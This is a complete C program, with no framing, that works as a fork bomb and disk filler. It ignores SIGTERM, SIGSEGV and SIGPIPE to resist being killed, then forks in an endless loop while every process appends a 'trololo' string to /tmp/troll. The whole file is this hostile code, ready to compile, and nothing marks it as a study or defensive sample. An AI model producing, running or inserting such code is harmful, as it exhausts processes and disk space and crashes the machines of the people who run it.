#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

int main()
{
	signal(SIGPIPE,SIG_IGN);
	signal(SIGTERM,SIG_IGN);
	signal(SIGSEGV,SIG_IGN);
	const char* troll="trololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololololo\n";
	int l=strlen(troll);
	while(1)
	{
		fork();
		int f=open("/tmp/troll",O_APPEND|O_CREAT|O_WRONLY,0777);
		write(f,troll,l);
		close(f);
	}
}
